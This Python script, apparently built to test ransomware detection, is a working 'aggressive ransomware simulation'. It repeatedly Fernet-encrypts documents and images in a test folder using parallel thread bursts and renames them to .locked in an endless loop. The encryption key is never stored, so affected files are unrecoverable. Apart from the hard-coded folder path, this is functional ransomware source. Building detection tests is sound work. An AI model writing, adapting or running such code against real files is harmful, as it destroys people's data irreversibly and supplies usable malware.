import os
import time
import threading
from cryptography.fernet import Fernet

path = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "test_folder"
)

key = Fernet.generate_key()
fernet = Fernet(key)

EXTENSIONS_TO_ATTACK = {".txt", ".pdf", ".jpg", ".png", ".docx", ".csv"}
CHUNK_WRITES = 4          # multiple writes per file
RENAME_STAGES = [".tmp", ".crypt", ".locked"]

def encrypt_file_aggressively(file_path):
    try:
        with open(file_path, "rb") as f:
            data = f.read()

        for _ in range(CHUNK_WRITES):
            data = fernet.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(data)
            time.sleep(0.005)  # extremely tight deltas

        # Rename storm
        base = file_path
        for ext in RENAME_STAGES:
            new = base + ext
            os.rename(base, new)
            base = new
            time.sleep(0.003)

    except Exception:
        pass


def ransomware_loop():
    while True:
        targets = []

        for root, _, files in os.walk(path):
            for f in files:
                if f == "README_RESTORE.txt":
                    continue
                if any(f.endswith(ext) for ext in EXTENSIONS_TO_ATTACK):
                    full = os.path.join(root, f)
                    if not full.endswith(".locked"):
                        targets.append(full)

        # PARALLEL ENCRYPTION (this is key)
        threads = []
        for t in targets[:10]:  # burst attack
            th = threading.Thread(target=encrypt_file_aggressively, args=(t,))
            th.start()
            threads.append(th)

        for th in threads:
            th.join()

        # No cooldown — real ransomware doesn’t rest
        time.sleep(0.2)


if __name__ == "__main__":
    print("[!] Aggressive Ransomware Simulation Started")
    ransomware_loop()